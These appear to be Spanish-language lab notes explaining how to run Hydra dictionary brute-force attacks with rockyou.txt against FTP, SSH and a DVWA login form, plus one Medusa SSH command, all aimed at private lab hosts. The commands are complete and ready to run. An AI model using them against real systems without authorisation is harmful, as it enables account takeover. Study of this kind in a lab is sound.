# Hidra.

## FTP

***HIDRA*** es una herramienta que nos permite poder ejecutar ataques de fuerza bruta por medio de ***diccionarios***.

~~~
hydra 10.0.2.5 ftp -l msfadmin -P rockyou.txt -s 21
~~~

Explicación:

	 hydra -> Para utilizar la herramienta.
	 192.168.138.130 -> la IP de la victima.
	 ftp -> Servicio a accesar.
	 -l -> Colocar el usuario (si se planea utilizar un diccionario se utiliza -L).
	 msfadmin -> nombre del usuario (si se utiliza -L, colocamos el nombre del diccionario).
	 -P -> (En mayuscula) para indicar el password (en este caso al ser -P y no -p, se utilizará un diccionario).
	 rockyou.txt -> Nombre y extensión de archivo de diccionario.
	 -s 21 -> El puerto por el cual queremos acceder el ataque.

Si queremos ver el contenido y directorio del ***diccionario*** podemos ejecutar el:

~~~
locate rockyou.txt
~~~

Ubicandose en: `/usr/share/wordlists/rockyou.txt.gz`.

Si hacemos un:

~~~
cd /usr/share/wordlists
~~~

y un:

~~~
ls
~~~

Podremos ver los diferentes diccionarios.

Y con:

~~~
cat rockyou.txt
~~~

Podemos visualizar el contenido del diccionario.

---
## SSH

~~~
hydra 10.0.2.5 ssh -l msfadmin -P rockyou.txt -s 22
~~~

Cambiamos:

	- el "ftp" por "ssh".
	- el "-s 21" (ftp) por "-s 22" (SSH).

## Buscar palabras en diccionario

~~~
cat <diccionario.txt> | grep <palabra>
~~~

~~~
cat rockyou.txt | grep msfadmin
~~~

***Nota:*** Esto devolverá ***TODAS*** las palabras que contengan la palabra ingresada.

---
## Formularios web

Para poder utilizar ***formularios web*** con ***HYDRA*** es un poco diferente.

***Nota:*** Necesitamos la ayuda de ***Burp Suite*** (preinstalado en kali-linux).

	Debemos realizar una peticion y capturar información del paquete para utilizarlos.
	- El metodo (POST o GET)
	- la URL de la petición.
	- Los parametros a enviar

Como el ejemplo siguiente:

~~~
POST /dvwa/login.php HTTP/1.1
Host: 10.0.2.5
Content-Length: 45
Cache-Control: max-age=0
Accept-Language: es-419,es;q=0.9
Origin: http://10.0.2.5
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.0.2.5/dvwa/login.php
Accept-Encoding: gzip, deflate, br
Cookie: security=high; PHPSESSID=b27f8343e50b29598dbd42f58eaabad0
Connection: keep-alive

username=canario&password=canario&Login=Login
~~~

~~~
hydra -l admin -P rockyou.txt 10.0.2.5 http-post-form '/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed'
~~~

~~~
medusa -h 192.168.0.105 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ssh -n 22
~~~